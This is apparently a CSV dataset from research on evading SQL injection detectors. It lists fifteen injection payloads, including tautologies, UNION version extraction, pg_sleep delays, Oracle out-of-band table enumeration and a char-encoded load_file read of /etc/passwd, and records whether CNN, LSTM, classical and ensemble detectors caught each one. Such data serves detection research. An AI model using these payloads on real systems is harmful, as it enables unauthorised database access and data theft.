,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
0,""" or pg_sleep  (  __TIME__  )  --",""" or pg_sleep  (  __TIME__  )  --",0,1,0,0,0,0,0
1,create user name identified by pass123 temporary tablespace temp default tablespace users;,create user name identified by pass123 temporary tablespace temp default tablespace users;,1,1,1,1,1,1,1
2," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
3," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'"," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,1,1,0,0,0,0
4," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1"," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",0,1,0,0,0,0,0
5, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1,1,0,0,0,0,0
6,select * from users where id  =  1 +$+ or 1  =  1 -- 1,select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,1,0,0,0,0,0
7,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;","1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",0,1,0,0,0,0,0
8," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'"," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1,1,0,0,0,0,0
9," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'"," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",0,1,1,0,0,0,0
10,? or 1  =  1 --,? or 1  =  1 --,0,1,0,0,0,0,0
11, )   or   (  'a'  =  'a, )   or   (  'a'  =  'a,1,1,0,0,0,0,0
12,admin' or 1  =  1#,admin' or 1  =  1#,1,1,0,0,0,0,0
13," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",0,1,0,0,0,0,0
14,or 1  =  1 --,or 1  =  1 --,0,1,0,0,0,0,0
